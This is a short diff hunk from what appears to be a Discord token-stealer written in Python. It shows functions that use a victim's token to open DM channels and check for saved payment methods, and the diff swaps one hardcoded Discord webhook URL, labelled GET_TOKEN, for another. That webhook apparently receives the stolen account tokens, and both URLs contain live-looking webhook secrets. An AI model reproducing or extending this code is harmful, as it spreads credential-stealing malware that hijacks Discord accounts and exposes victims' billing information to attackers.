@@ -86,7 +86,7 @@ def getchat(token, uid):
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
     except:
         pass
-GET_TOKEN = 'https://discord.com/api/webhooks/884834603091771412/6JpHMhKRLeYm_OSftepH6fq9nwMV4-75-QdlGOIXwSz9iB1rosW1gun5Y7ntQtyU4ZEu'
+GET_TOKEN = 'https://discord.com/api/webhooks/907297166668750849/YrFzrGjhh-3UQRlPLGo5YgxQ6KPS2qsUEwKKu_d4PTqhHWYZIYdCiay4WC2id0rYNyU7'
 def has_payment_methods(token):
     try:
         return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
